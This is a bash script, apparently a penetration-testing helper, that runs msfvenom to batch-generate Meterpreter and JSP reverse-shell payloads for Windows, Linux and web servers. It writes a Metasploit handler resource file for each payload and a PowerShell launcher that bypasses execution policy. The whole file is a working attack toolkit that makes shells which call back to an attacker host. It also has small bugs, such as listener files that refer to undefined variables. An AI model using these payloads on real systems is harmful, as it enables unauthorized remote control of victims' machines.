#!/bin/bash

###
### Global variabels
###

SCRIPT_PATH=$(readlink -f """${0}""")
SCRIPT_DIRECTORY=$(dirname """${SCRIPT_PATH}""")
BASE_DIRECTORY=$(dirname `readlink -f """${SCRIPT_DIRECTORY}/.."""`)

PAYLOADS_DIRECTORY="""${HOME}/payloads"""
WINDOWS_PAYLOADS_DIRECTORY="""${PAYLOADS_DIRECTORY}/windows"""
LINUX_PAYLOADS_DIRECTORY="""${PAYLOADS_DIRECTORY}/linux"""
WEB_PAYLOADS_DIRECTORY="""${PAYLOADS_DIRECTORY}/web"""

PAYLOADS_START_PORT=30000
PAYLOAD_PORT=0
DEFAULT_INTERFACE=$(ip -o -4 route show to default | awk '/dev/ {print $5}')
DEFAULT_INTERFACE_ADDRESS=$(ifconfig ${DEFAULT_INTERFACE_ADDRESS}  | grep -o -h -U -P 'inet\s[^0-9]*([^\s]*)' | sed "s#inet\s[^0-9]*##gi" | head -n 1)

function build_reverse_shell_listener() {
    local payload="""${1}"""
    local lhost="""${2}"""
    local lport="""${3}"""

    local listener_code=$(cat<<SCRIPT
use exploit/multi/handler
set payload ${payload}
set LHOST ${rhost}
set LPORT ${rport}

run
SCRIPT
)

    echo """${listener_code}"""
}

function build_bind_shell_listener() {
    local payload="""${1}"""
    local rhost="""${2}"""
    local rport="""${3}"""
    
    local listener_code=$(cat<<SCRIPT
use exploit/multi/handler
set payload ${payload}
set RHOST ${rhost}
set RPORT ${rport}

run
SCRIPT
)

    echo """${listener_code}"""
}

if [[ ! -z """${1}""" ]]
then
    TARGET_IP="""${1}"""
    PAYLOADS_OPTIONS=""

    if [[ ! -z """${2}""" ]]
    then
        if [[ ! -z """${3}""" ]]
        then
            ATTACKER_IP="""${2}"""
            PAYLOADS_START_PORT=${3}
        else
            PAYLOADS_START_PORT=${2}
        fi
    fi

    PAYLOADS_OPTIONS="""LHOST=${ATTACKER_IP} RHOST=${TARGET_IP}"""
    PAYLOAD_PORT=${PAYLOADS_START_PORT}

    echo "====================---[ OPTIONS ]---===================="
    echo ""
    echo """         ATTACKER IP: ${ATTACKER_IP}"""
    echo """           TARGET IP: ${TARGET_IP}"""
    echo """          START PORT: ${PAYLOADS_START_PORT}"""
    echo """  PAYLOADS DIRECTORY: ${PAYLOADS_DIRECTORY}"""
    echo ""
    echo "=========================================================="
    echo ""
    echo ""
    
    echo "[*] Building 'Windows' payloads (directory: ${WINDOWS_PAYLOADS_DIRECTORY}) ..."
    if [[ ! -d """${WINDOWS_PAYLOADS_DIRECTORY}""" ]]
    then
        mkdir -p """${WINDOWS_PAYLOADS_DIRECTORY}"""
    fi

    eval """msfvenom -p windows/x64/meterpreter_reverse_tcp ${PAYLOADS_OPTIONS} LPORT=${PAYLOAD_PORT} -f perl > ${WINDOWS_PAYLOADS_DIRECTORY}/revshell64.pl"""
    PAYLOAD_LISTENER_CODE=$(build_reverse_shell_listener """windows/x64/meterpreter_reverse_tcp""" """${ATTACKER_IP}""" ${PAYLOAD_PORT})
    echo """${PAYLOAD_LISTENER_CODE}""" > """${WINDOWS_PAYLOADS_DIRECTORY}/revshell64_pl.listener.rc"""
    PAYLOAD_PORT=$((PAYLOAD_PORT+1))

    eval """msfvenom -p windows/meterpreter_reverse_tcp ${PAYLOADS_OPTIONS} LPORT=${PAYLOAD_PORT} -f exe > ${WINDOWS_PAYLOADS_DIRECTORY}/revshell.exe"""
    PAYLOAD_LISTENER_CODE=$(build_reverse_shell_listener """windows/meterpreter_reverse_tcp""" """${ATTACKER_IP}""" ${PAYLOAD_PORT})
    echo """${PAYLOAD_LISTENER_CODE}""" > """${WINDOWS_PAYLOADS_DIRECTORY}/revshell_exe.listener.rc"""
    PAYLOAD_PORT=$((PAYLOAD_PORT+1))

    eval """msfvenom -p windows/meterpreter_reverse_tcp ${PAYLOADS_OPTIONS} LPORT=${PAYLOAD_PORT} -f msi > ${WINDOWS_PAYLOADS_DIRECTORY}/revshell.msi"""
    PAYLOAD_LISTENER_CODE=$(build_reverse_shell_listener """windows/meterpreter_reverse_tcp""" """${ATTACKER_IP}""" ${PAYLOAD_PORT})
    echo """${PAYLOAD_LISTENER_CODE}""" > """${WINDOWS_PAYLOADS_DIRECTORY}/revshell_msi.listener.rc"""
    PAYLOAD_PORT=$((PAYLOAD_PORT+1))

    eval """msfvenom -p windows/meterpreter_reverse_tcp ${PAYLOADS_OPTIONS} LPORT=${PAYLOAD_PORT} -f bat > ${WINDOWS_PAYLOADS_DIRECTORY}/revshell.bat"""
    PAYLOAD_LISTENER_CODE=$(build_reverse_shell_listener """windows/meterpreter_reverse_tcp""" """${ATTACKER_IP}""" ${PAYLOAD_PORT})
    echo """${PAYLOAD_LISTENER_CODE}""" > """${WINDOWS_PAYLOADS_DIRECTORY}/revshell_bat.listener.rc"""
    PAYLOAD_PORT=$((PAYLOAD_PORT+1))

    eval """msfvenom -p windows/meterpreter_reverse_tcp ${PAYLOADS_OPTIONS} LPORT=${PAYLOAD_PORT} -f exe > ${WINDOWS_PAYLOADS_DIRECTORY}/revshell32.exe"""
    PAYLOAD_LISTENER_CODE=$(build_reverse_shell_listener """windows/meterpreter_reverse_tcp""" """${ATTACKER_IP}""" ${PAYLOAD_PORT})
    echo """${PAYLOAD_LISTENER_CODE}""" > """${WINDOWS_PAYLOADS_DIRECTORY}/revshell32_exe.listener.rc"""
    PAYLOAD_PORT=$((PAYLOAD_PORT+1))

    eval """msfvenom -p windows/x64/meterpreter_reverse_tcp ${PAYLOADS_OPTIONS} LPORT=${PAYLOAD_PORT} -f exe > ${WINDOWS_PAYLOADS_DIRECTORY}/revshell64.exe"""
    PAYLOAD_LISTENER_CODE=$(build_reverse_shell_listener """windows/x64/meterpreter_reverse_tcp""" """${ATTACKER_IP}""" ${PAYLOAD_PORT})
    echo """${PAYLOAD_LISTENER_CODE}""" > """${WINDOWS_PAYLOADS_DIRECTORY}/revshell64_exe.listener.rc"""
    PAYLOAD_PORT=$((PAYLOAD_PORT+1))

    eval """msfvenom -p python/meterpreter_reverse_tcp ${PAYLOADS_OPTIONS} LPORT=${PAYLOAD_PORT} -f python > ${WINDOWS_PAYLOADS_DIRECTORY}/revshell.py"""
    PAYLOAD_LISTENER_CODE=$(build_reverse_shell_listener """python/meterpreter_reverse_tcp""" """${ATTACKER_IP}""" ${PAYLOAD_PORT})
    echo """${PAYLOAD_LISTENER_CODE}""" > """${WINDOWS_PAYLOADS_DIRECTORY}/revshell_py.listener.rc"""
    PAYLOAD_PORT=$((PAYLOAD_PORT+1))

    eval """msfvenom -p windows/x64/meterpreter_reverse_tcp ${PAYLOADS_OPTIONS} LPORT=${PAYLOAD_PORT} -f psh > ${WINDOWS_PAYLOADS_DIRECTORY}/revshell64.ps1"""
    echo """powershell.exe -ExecutionPolicy Bypass -File .\revshell64.ps1""" > """${WINDOWS_PAYLOADS_DIRECTORY}/revshell64_ps1.run.bat"""
    echo """[!] to run this powershell payload, you must upload: ${WINDOWS_PAYLOADS_DIRECTORY}/revshell64_ps1.run.bat in the same directory of ${WINDOWS_PAYLOADS_DIRECTORY}/revshell64.ps1"""
    echo """    and run ${WINDOWS_PAYLOADS_DIRECTORY}/revshell64_ps1.run.bat or: powershell.exe -ExecutionPolicy Bypass -File .\revshell64.ps1"""
    PAYLOAD_LISTENER_CODE=$(build_reverse_shell_listener """windows/x64/meterpreter_reverse_tcp""" """${ATTACKER_IP}""" ${PAYLOAD_PORT})
    echo """${PAYLOAD_LISTENER_CODE}""" > """${WINDOWS_PAYLOADS_DIRECTORY}/revshell64_ps1.listener.rc"""
    PAYLOAD_PORT=$((PAYLOAD_PORT+1))

    echo "[*] Building 'Linux' payloads (directory: ${LINUX_PAYLOADS_DIRECTORY}) ..."
    if [[ ! -d """${LINUX_PAYLOADS_DIRECTORY}""" ]]
    then
        mkdir -p """${LINUX_PAYLOADS_DIRECTORY}"""
    fi

    eval """msfvenom -p linux/x64/meterpreter_reverse_tcp ${PAYLOADS_OPTIONS} LPORT=${PAYLOAD_PORT} -f bin > ${LINUX_PAYLOADS_DIRECTORY}/revshell64.bin"""
    PAYLOAD_LISTENER_CODE=$(build_reverse_shell_listener """linux/x64/meterpreter_reverse_tcp""" """${ATTACKER_IP}""" ${PAYLOAD_PORT})
    echo """${PAYLOAD_LISTENER_CODE}""" > """${LINUX_PAYLOADS_DIRECTORY}/revshell64_bin.listener.rc"""
    PAYLOAD_PORT=$((PAYLOAD_PORT+1))

    eval """msfvenom -p linux/meterpreter_reverse_tcp ${PAYLOADS_OPTIONS} LPORT=${PAYLOAD_PORT} -f bin > ${LINUX_PAYLOADS_DIRECTORY}/revshell32.bin"""
    PAYLOAD_LISTENER_CODE=$(build_reverse_shell_listener """linux/meterpreter_reverse_tcp""" """${ATTACKER_IP}""" ${PAYLOAD_PORT})
    echo """${PAYLOAD_LISTENER_CODE}""" > """${LINUX_PAYLOADS_DIRECTORY}/revshell32_bin.listener.rc"""
    PAYLOAD_PORT=$((PAYLOAD_PORT+1))

    eval """msfvenom -p linux/meterpreter_reverse_tcp ${PAYLOADS_OPTIONS} LPORT=${PAYLOAD_PORT} -f perl > ${LINUX_PAYLOADS_DIRECTORY}/revshell32.pl"""
    PAYLOAD_LISTENER_CODE=$(build_reverse_shell_listener """linux/meterpreter_reverse_tcp""" """${ATTACKER_IP}""" ${PAYLOAD_PORT})
    echo """${PAYLOAD_LISTENER_CODE}""" > """${LINUX_PAYLOADS_DIRECTORY}/revshell32_pl.listener.rc"""
    PAYLOAD_PORT=$((PAYLOAD_PORT+1))

    eval """msfvenom -p linux/x64/meterpreter_reverse_tcp ${PAYLOADS_OPTIONS} LPORT=${PAYLOAD_PORT} -f perl > ${LINUX_PAYLOADS_DIRECTORY}/revshell64.pl"""
    PAYLOAD_LISTENER_CODE=$(build_reverse_shell_listener """linux/x64/meterpreter_reverse_tcp""" """${ATTACKER_IP}""" ${PAYLOAD_PORT})
    echo """${PAYLOAD_LISTENER_CODE}""" > """${LINUX_PAYLOADS_DIRECTORY}/revshell64_pl.listener.rc"""
    PAYLOAD_PORT=$((PAYLOAD_PORT+1))

    eval """msfvenom -p python/meterpreter_reverse_tcp ${PAYLOADS_OPTIONS} LPORT=${PAYLOAD_PORT} -f python > ${LINUX_PAYLOADS_DIRECTORY}/revshell.py"""
    PAYLOAD_LISTENER_CODE=$(build_reverse_shell_listener """python/meterpreter_reverse_tcp""" """${ATTACKER_IP}""" ${PAYLOAD_PORT})
    echo """${PAYLOAD_LISTENER_CODE}""" > """${LINUX_PAYLOADS_DIRECTORY}/revshell_py.listener.rc"""
    PAYLOAD_PORT=$((PAYLOAD_PORT+1))

    eval """msfvenom -p linux/x64/meterpreter_reverse_tcp ${PAYLOADS_OPTIONS} LPORT=${PAYLOAD_PORT} -f sh > ${LINUX_PAYLOADS_DIRECTORY}/revshell.sh"""
    PAYLOAD_LISTENER_CODE=$(build_reverse_shell_listener """linux/x64/meterpreter_reverse_tcp""" """${ATTACKER_IP}""" ${PAYLOAD_PORT})
    echo """${PAYLOAD_LISTENER_CODE}""" > """${LINUX_PAYLOADS_DIRECTORY}/revshell_sh.listener.rc"""
    PAYLOAD_PORT=$((PAYLOAD_PORT+1))

    echo "[*] Building 'Web' payloads (directory: ${WEB_PAYLOADS_DIRECTORY}) ..."
    if [[ ! -d """${WEB_PAYLOADS_DIRECTORY}""" ]]
    then
        mkdir -p """${WEB_PAYLOADS_DIRECTORY}"""
    fi

    eval """msfvenom -p php/meterpreter_reverse_tcp ${PAYLOADS_OPTIONS} LPORT=${PAYLOAD_PORT} -f raw > ${WEB_PAYLOADS_DIRECTORY}/revshell.php"""
    PAYLOAD_LISTENER_CODE=$(build_reverse_shell_listener """php/meterpreter_reverse_tcp""" """${ATTACKER_IP}""" ${PAYLOAD_PORT})
    echo """${PAYLOAD_LISTENER_CODE}""" > """${WEB_PAYLOADS_DIRECTORY}/revshell_php.listener.rc"""
    PAYLOAD_PORT=$((PAYLOAD_PORT+1))

    eval """msfvenom -p windows/meterpreter_reverse_tcp ${PAYLOADS_OPTIONS} LPORT=${PAYLOAD_PORT} -f asp > ${WEB_PAYLOADS_DIRECTORY}/revshell.asp"""
    PAYLOAD_LISTENER_CODE=$(build_reverse_shell_listener """windows/meterpreter_reverse_tcp""" """${ATTACKER_IP}""" ${PAYLOAD_PORT})
    echo """${PAYLOAD_LISTENER_CODE}""" > """${WEB_PAYLOADS_DIRECTORY}/revshell_asp.listener.rc"""
    PAYLOAD_PORT=$((PAYLOAD_PORT+1))

    eval """msfvenom -p java/jsp_shell_reverse_tcp ${PAYLOADS_OPTIONS} LPORT=${PAYLOAD_PORT} -f raw > ${WEB_PAYLOADS_DIRECTORY}/revshell.jsp"""
    PAYLOAD_LISTENER_CODE=$(build_reverse_shell_listener """java/jsp_shell_reverse_tcp""" """${ATTACKER_IP}""" ${PAYLOAD_PORT})
    echo """${PAYLOAD_LISTENER_CODE}""" > """${WEB_PAYLOADS_DIRECTORY}/revshell_jsp.listener.rc"""
    PAYLOAD_PORT=$((PAYLOAD_PORT+1))

    eval """msfvenom -p java/meterpreter_reverse_tcp ${PAYLOADS_OPTIONS} LPORT=${PAYLOAD_PORT} -f war > ${WEB_PAYLOADS_DIRECTORY}/revshell.war"""
    PAYLOAD_LISTENER_CODE=$(build_reverse_shell_listener """java/meterpreter_reverse_tcp""" """${ATTACKER_IP}""" ${PAYLOAD_PORT})
    echo """${PAYLOAD_LISTENER_CODE}""" > """${WEB_PAYLOADS_DIRECTORY}/revshell_war.listener.rc"""
    PAYLOAD_PORT=$((PAYLOAD_PORT+1))
else
    echo "Usage: ${0} <TARGET_IP> [<ATTACKER_IP> <START_PORT>]"
    echo "       ${0} <TARGET_IP> [<START_PORT>]"
fi
